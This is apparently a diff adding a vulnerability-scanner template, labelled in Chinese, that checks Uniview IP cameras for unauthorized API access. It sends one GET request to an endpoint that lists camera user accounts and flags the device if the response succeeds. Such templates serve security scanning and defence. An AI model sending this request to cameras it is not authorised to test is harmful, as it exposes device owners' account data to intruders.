@@ -1,0 +1,16 @@
+id: poc-yaml-uniview-api-unauthorized-access
+info:
+  name: Uniview IPCamera API 未授权访问漏洞
+  severity: high
+  tags:
+  - 未授权访问
+  finger: Uniview
+  osprey-id: vb_2022_0048
+requests:
+- method: GET
+  path: /LAPI/V1.0/Channel/0/System/Users
+  expression: 'contains(body, "\"StatusString\": \"Succeed\"") && contains(body, "Users")
+
+    '
+variables: {}
+transport: http
